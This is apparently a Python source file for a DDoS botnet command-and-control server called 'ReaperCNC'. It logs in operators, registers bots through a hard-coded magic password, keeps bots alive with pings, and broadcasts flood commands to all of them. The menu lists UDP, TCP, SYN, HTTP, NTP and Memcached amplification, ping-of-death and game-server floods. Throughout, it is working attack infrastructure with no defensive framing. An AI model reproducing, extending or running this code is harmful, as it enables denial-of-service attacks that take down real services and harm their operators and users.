# Tools
from src.Commands.Tools.url_to_ip import url_to_ip
from src.Commands.Tools.ip_to_loc import ip_to_loc

# Layer 3
from src.Commands.Methods_L3.icmp import icmp
from src.Commands.Methods_L3.pod import pod

# Layer 4
from src.Commands.Methods_L4.junk import junk
from src.Commands.Methods_L4.tcp import tcp
from src.Commands.Methods_L4.udp import udp
from src.Commands.Methods_L4.hex import hex
from src.Commands.Methods_Games.roblox import roblox
from src.Commands.Methods_L4.tup import tup

# AMP METHODS
from src.Commands.AMP.ntp import ntp
from src.Commands.AMP.mem import mem

# Layer 7
from src.Commands.Methods_L7.http_req import http_req
from src.Commands.Methods_L7.http_cfb import http_cfb
from src.Commands.Methods_L7.httpio import httpio
from src.Commands.Methods_L7.httpspoof import httpspoof
from src.Commands.Methods_L7.httpstorm import httpstorm
from src.Commands.Methods_L7.httpget import httpget

# Imports
import socket, threading, time, ipaddress, json
from colorama import Fore, init

def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLACK_EX")
yellow = color("YELLOW")
green = color("LIGHTGREEN_EX")
green2 = color("GREEN")
red = color("RED")
banner = rf'''

{Fore.RED}                ...                             {Fore.RED}  ╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗  ╔═╗╔╗╔╔═╗ 
{Fore.RED}              ;::::;                            {Fore.RED}  ╠╦╝║╣ ╠═╣╠═╝║╣ ╠╦╝  ║  ║║║║    
{Fore.RED}            ;::::; :;                           {Fore.RED}  ╩╚═╚═╝╩ ╩╩  ╚═╝╩╚═  ╚═╝╝╚╝╚═╝  
{Fore.RED}          ;:::::'   :;                             
{Fore.RED}         ;:::::;     ;.                           
{Fore.RED}        ,:::::'       ;           OOO\           
{Fore.RED}        ::::::;       ;          OOOOO\            
{Fore.RED}        ;:::::;       ;         OOOOOOOO           
{Fore.RED}       ,;::::::;     ;'         / OOOOOOO          
{Fore.RED}     ;:::::::::`. ,,,;.        /  / DOOOOOO        
{Fore.RED}   .';:::::::::::::::::;,     /  /     DOOOO     
{Fore.RED}  ,::::::;::::::;;;;::::;,   /  /        DOOO     
{Fore.RED} ;`::::::`'::::::;;;::::: ,#/  /          DOOO   
{Fore.RED} :`:::::::`;::::::;;::: ;::#  /            DOOO   
{Fore.RED} ::`:::::::`;:::::::: ;::::# /              DOO   
{Fore.RED} `:`:::::::`;:::::: ;::::::#/               DOO
{Fore.RED}  :::`:::::::`;; ;:::::::::##                OO
{Fore.RED}  ::::`:::::::`;::::::::;:::#                OO
{Fore.RED}  `:::::`::::::::::::;'`:;::#                O
{Fore.RED}   `:::::`::::::::;' /  / `:#
{Fore.RED}    ::::::`:::::;'  /  /   `#
{Fore.RED}       

'''

rules = f"""{lightwhite}1. {Fore.RED}Do not attack .gov/.gob/.edu/.mil domains  
{lightwhite}2. {Fore.RED}Do not spam attacks"""

help = f"""{lightwhite}HELP         {Fore.RED}Shows list of commands   
{lightwhite}METHODS      {Fore.CYAN}Shows list of methods 
{lightwhite}TOOLS        {Fore.CYAN}Shows list of tools   
{lightwhite}RULES        {Fore.CYAN}Shows list of rules  
{lightwhite}SERVERS      {Fore.CYAN}Shows available servers
{lightwhite}CLEAR        {Fore.CYAN}Clears the screen          
{lightwhite}EXIT         {Fore.CYAN}Disconnects from the net"""
methods = f"""
{Fore.CYAN}[{lightwhite}L4 Methods{Fore.CYAN}]
{Fore.CYAN} > {lightwhite}.UDP  [{green}PROTECTED{lightwhite}] Floods target with trashed UDP data packets            {Fore.CYAN}|{lightwhite} VIP: {green}█
{Fore.CYAN} > {lightwhite}.TUP  [{green}PROTECTED{lightwhite}] Floods target with trashed UDP & TCP data packets      {Fore.CYAN}|{lightwhite} VIP: {green}█
{Fore.CYAN} > {lightwhite}.TCP  [{yellow}PROT & UNPROT{lightwhite}] Floods target with trashed TCP data packets        {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.SYN  [{yellow}PROT & UNPROT{lightwhite}] Floods target with SYNchronize TCP packets         {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.HEX  [{red}UNPROTECTED{lightwhite}] Floods target with Hex Packets                       {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.JUNK [{green}PROTECTED{lightwhite}] Floods target with trashed junk packets                {Fore.CYAN}|{lightwhite} VIP: {green}█

{Fore.CYAN}[{lightwhite}L4 Methods GAME{Fore.CYAN}]
{Fore.CYAN} > {lightwhite}.ROBLOX     [{green}PROTECTED{lightwhite}] Custom UDP Bypass With High packet flood         {Fore.CYAN}|{lightwhite} VIP: {green}█
{Fore.CYAN} > {lightwhite}.VSE        [{green}PROTECTED{lightwhite}] Floods target with VSE server queries            {Fore.CYAN}|{lightwhite} VIP: {red}█

{Fore.CYAN}[{lightwhite}L7 Methods{Fore.CYAN}]
{Fore.CYAN} > {lightwhite}.HTTPIP     [{yellow}PROT & UNPROT{lightwhite}] Floods target with Full Power!               {Fore.CYAN}|{lightwhite} VIP: {green}█
{Fore.CYAN} > {lightwhite}.HTTP       [{red}UNPROTECTED{lightwhite}] Floods target with HTTP GET requests           {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.HTTP_REQ   [{red}UNPROTECTED{lightwhite}] Floods target with HTTP REQ requests           {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.HTTP_CFB   [{red}UNPROTECTED{lightwhite}] Floods target with HTTP CFB requests           {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.HTTPGET    [{green}PROTECTED{lightwhite}] Floods target with HTTP GET requests             {Fore.CYAN}|{lightwhite} VIP: {green}█
{Fore.CYAN} > {lightwhite}.HTTPSTORM  [{red}UNPROTECTED{lightwhite}] Floods target with HTTP STORM requests         {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.HTTPSPOOF  [{green}PROTECTED{lightwhite}] Floods target with HTTP SPOOF requests           {Fore.CYAN}|{lightwhite} VIP: {green}█

{Fore.CYAN}[{lightwhite}L3 Methods{Fore.CYAN}]
{Fore.CYAN} > {lightwhite}.pod  [{red}UNPROTECTED{lightwhite}] Floods target with Ping Of Death                     {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.icmp [{red}UNPROTECTED{lightwhite}] Floods target with Flood ICMP Request                {Fore.CYAN}|{lightwhite} VIP: {red}█

{Fore.CYAN}[{lightwhite}AMP Methods{Fore.CYAN}]
{Fore.CYAN} > {lightwhite}.ntp [{red}UNPROTECTED{lightwhite}] Floods target with NTP Reflection AttSYN              {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}.mem [{red}UNPROTECTED{lightwhite}] Floods target with Memcached Flood                    {Fore.CYAN}|{lightwhite} VIP: {red}█

{Fore.CYAN}[{lightwhite}TOOLS Methods{Fore.CYAN}]
{Fore.CYAN} > {lightwhite}url_to_ip [{green}PROTECTED{lightwhite}] makes the url to an ip                             {Fore.CYAN}|{lightwhite} VIP: {red}█
{Fore.CYAN} > {lightwhite}iplookup  [{green}PROTECTED{lightwhite}] looks up the ip                                    {Fore.CYAN}|{lightwhite} VIP: {red}█
"""

tools = f""" 
{Fore.CYAN}[ {Fore.LIGHTWHITE_EX}Tools CATEGORY {Fore.CYAN}] - [{Fore.LIGHTWHITE_EX} Tools{gray} BASIC{Fore.CYAN} ]
{Fore.CYAN}.url_to_ip {Fore.CYAN}<{Fore.LIGHTWHITE_EX}target{Fore.CYAN}>
{Fore.CYAN}.iplookup  {Fore.CYAN}<{Fore.LIGHTWHITE_EX}target{Fore.CYAN}>
"""

admin_methods = f"""
{lightwhite}!register           {Fore.CYAN}Starts registration server
{lightwhite}!user               {Fore.CYAN}Add/remove users"""

bots = {}
user_name = ""
ansi_clear = '\033[2J\033[H'

def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def ping():
    while 1:
        dead_bots = []
        for bot in bots.copy().keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)


def handle_client(client, address):
    while 1:
        send(client, ansi_clear, False)
        send(client, f'\x1b{Fore.CYAN}Username {Fore.LIGHTWHITE_EX}:\x1b[0m ', False, False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, f'\033{Fore.CYAN}Password {Fore.LIGHTWHITE_EX}:\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break

    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + f'\x1b{Fore.RED}Invalid credentials')
            time.sleep(1)
            client.close()
            return

        global user_name
        user_name = username


        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=(client, username)).start()

    else:
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def user(args, send, client):
    try:
        choice = (args[1]).upper()
        if choice == 'ADD':
            if len(args) == 4:
                user = args[2]
                password = args[3]
                with open('src/logins.txt', 'a') as logins:
                    logins.write(f'\n{user}:{password}')
                    logins.close()
                    send(client, f'{Fore.LIGHTWHITE_EX}Added new user successfully.')
            else:
                send(client, '.USER ADD [USERNAME] [PASSWORD]')
        if choice == 'REMOVE':
            if len(args) == 3:
                user = args[2]
                with open("src/logins.txt", "r") as logins:
                    lines = logins.readlines()
                    logins.close()

                with open("src/logins.txt", "w") as logins:
                    for line in lines:
                        if user not in line:
                            logins.write(line)
                    logins.close()
                send(client, f'{Fore.LIGHTWHITE_EX}Removed user successfully!')
            else:
                send(client, '.USER REMOVE [USERNAME]')
    except:
        send(client, '.USER ADD/REMOVE')

def update_title(client, name):
    while 1:
        try:
            send(client, f"\33]0;ReaperCNC [/] Loaded [{len(bots)}] / User: [{name}] / Vip: [True]\a", False)
            time.sleep(1)
            send(client, f"\33]0;ReaperCNC [-] Loaded [{len(bots)}] / User: [{name}] / Vip: [True]\a", False)
            time.sleep(1)
            send(client, f"\33]0;ReaperCNC [\] Loaded [{len(bots)}] / User: [{name}] / Vip: [True]\a", False)
            time.sleep(1)
            send(client, f"\33]0;ReaperCNC [-] Loaded [{len(bots)}] / User: [{name}] / Vip: [True]\\a", False)
            time.sleep(1)
            send(client, f"\33]0;ReaperCNC [/] Loaded [{len(bots)}] / User: [{name}] / Vip: [True]\\a", False)
            time.sleep(1)
        except:
            client.close()

def command_line(client, username):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'{Fore.CYAN}(ReaperCNC@{Fore.LIGHTWHITE_EX}{username}{Fore.CYAN}) > '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            print(user_name, args)

            if command == 'HELP':
                for x in help.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'METHODS':
                send(client, ansi_clear, False)
                for x in methods.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'TOOLS':
                for x in tools.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'RULES':
                for x in rules.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, '\x1b[3;31;48m'+x)
            elif command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, '\x1b[3;31;48m'+x)
            elif command == '.SYN':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, f"{Fore.LIGHTWHITE_EX}Attack {Fore.CYAN}Status{Fore.LIGHTWHITE_EX}:")
                                send(client, f"{Fore.LIGHTWHITE_EX}I{Fore.CYAN}P{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{ip}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Po{Fore.CYAN}rt{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{port}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Dura{Fore.CYAN}tion{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{secs}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Met{Fore.CYAN}hod{Fore.LIGHTWHITE_EX}: {Fore.CYAN}SYN")
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
            elif command == '.VSE':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, f"{Fore.LIGHTWHITE_EX}Attack {Fore.CYAN}Status{Fore.LIGHTWHITE_EX}:")
                                send(client, f"{Fore.LIGHTWHITE_EX}I{Fore.CYAN}P{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{ip}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Po{Fore.CYAN}rt{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{port}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Dura{Fore.CYAN}tion{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{secs}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Met{Fore.CYAN}hod{Fore.LIGHTWHITE_EX}: {Fore.CYAN}VSE")
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')
            elif command == 'EXIT':
                send(client, f'{Fore.LIGHTWHITE_EX}Goodybe {Fore.CYAN}Reaper{Fore.LIGHTWHITE_EX}...\n')
                time.sleep(1)
                break
            elif command == 'SERVERS':
                send(client, f'{Fore.LIGHTWHITE_EX}Available servers: {Fore.CYAN}{len(bots)}.')
            elif command == 'ADMIN':
                if user_name == "root":
                    for x in admin_methods.split('\n'):
                        send(client, x)
            elif command == 'R' or command == '!REG' or command == '!REGISTER':
                if user_name == "root":
                    threading.Thread(target=reg_main).start()
                    send(client, f'{Fore.CYAN}Started registration server.')
            elif command == 'USER' or command == '!U':
                if user_name == "root":
                    user(args, send, client)
            elif command == ".IP_TO_LOCAT" or command == ".IP_TO_LOCATION" or command == ".IP_GEO" or command == ".IP_GEOLOCATION" or command == ".IPLOOKUP":
                ip_to_loc(args, send, client, gray)
            elif command == ".URL_TO_IP":
                url_to_ip(args, send, client, gray)
            elif command == '.UDP':
                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
            elif command == '.MEM':
                mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.ICMP':
                icmp(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.POD':
                pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.NTP':
                ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.HTTPSTORM':
                httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPIO':
                httpio(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTP_SPOOF':
                httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPGET':
                httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.HTTP':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                                send(client, f"{Fore.LIGHTWHITE_EX}Attack {Fore.CYAN}Status{Fore.LIGHTWHITE_EX}:")
                                send(client, f"{Fore.LIGHTWHITE_EX}I{Fore.CYAN}P{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{ip}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Dura{Fore.CYAN}tion{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{secs}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Met{Fore.CYAN}hod{Fore.LIGHTWHITE_EX}: {Fore.CYAN}HTTP")
                                broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .http [IP] [TIME]')
            elif command == '.TUP':
                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
            elif command == '.TCP':
                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
            elif command == '.HEX':
                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.ROBLOX':
                roblox(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.JUNK': 
                junk(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.HTTP_REQ':
                http_req(args, validate_time, send, client, ansi_clear, broadcast, data)
            elif command == '.HTTP_CFB':
                http_cfb(args, validate_time, send, client, ansi_clear, broadcast, data)
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
"""

def register(client, address, send):
    ansi_clear = '\033[2J\033[H'
    try:
        send(client, ansi_clear, False)
        while 1:
            send(client, f'\x1b{Fore.CYAN}Username :\x1b[0m ', False, False)
            username = client.recv(1024).decode().strip()
            if not username:
                continue
            break
        with open("src/logins.txt", "r") as logins:
            lines = logins.readlines()
            for line in lines:
                if username in line:
                    send(client, f'{Fore.CYAN}User already exists!')
                    time.sleep(1)
                    client.close()
            logins.close()
        p1 = ''
        while 1:
            send(client, f'\033{Fore.CYAN}Password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p1.strip():
                p1 = client.recv(1024).decode('cp1252').strip()
            break
        p2 = ''
        while 1:
            send(client, f'\033{Fore.CYAN}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p2.strip():
                p2 = client.recv(1024).decode('cp1252').strip()
            break
        while 1:
            if p1 == p2:
                with open("src/logins.txt", "a") as logins:
                    logins.write("\n" + username + ':' + p1)
                send(client, f"{Fore.LIGHTWHITE_EX}Registered!")
                time.sleep(2)
            else:
                send(client, "Failed password authentication...")
            break
    except:
        send(client, "Error.")

def reg_main():
    with open("src/config.json") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()
    reg_port = int(jsonObject['reg_port'])
    reg_host = jsonObject['reg_host']
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((reg_host, reg_port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=register, args=[*sock.accept(), send]).start()

def banners(file, client):
    with open(f'UI/{file}', encoding='utf-8') as file:
        for line in file:
            client.send(f"\r{line}".encode())
        main(client)

def gifs(file, client):
    with open(f'TermFX/Gifs/{file}', encoding='utf-8') as file:
        for line in file:
            client.send(f"\r{line}".encode())
            time.sleep(0.001)
def main():
    with open("src/config.json") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()
    cnc_port = int(jsonObject['cnc_port'])
    reg_port = int(jsonObject['reg_port'])
    cnc_host = jsonObject['cnc_host']
    if cnc_port == reg_port:
        print("Cnc port and registration port must be different from eachother.")
        exit()
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)
    try:
        sock.bind((cnc_host, cnc_port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=ping).start()
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

def start():
    try:
        main()
    except:
        print("Error, skipping..")
